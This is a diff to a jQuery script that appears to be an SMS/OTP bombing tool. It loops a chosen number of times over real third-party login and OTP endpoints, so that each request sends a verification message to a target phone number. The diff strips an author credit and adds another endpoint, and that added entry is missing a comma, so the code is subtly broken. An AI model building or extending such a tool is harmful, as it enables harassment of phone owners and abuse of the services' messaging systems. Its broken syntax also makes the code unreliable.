@@ -1,6 +1,3 @@
-// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
-// Removing credit won't make you a cool programmer xD
-
 $(document).ready(() => {
 
     $(document).on('click', '#send', function (e) {
@@ -11,7 +8,6 @@ $(document).ready(() => {
         if (amount > 0 && mobile.length == 10) {
             var c = 0;
 
-            // Example of variable based api list , if you use this, comment out the fetch method
              const APIS = [
                  {
                      method: "POST",
@@ -34,7 +30,11 @@ $(document).ready(() => {
                      url: "https://ss.binge.buzz/otp/send/login",
                      method: "POST",
                      body: `phone=${mobile}`
-                 }
+                 },
+                 {
+                     method:`GET`
+                     url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${mobile}`
+        }
 
              ];
              while (c < amount) {
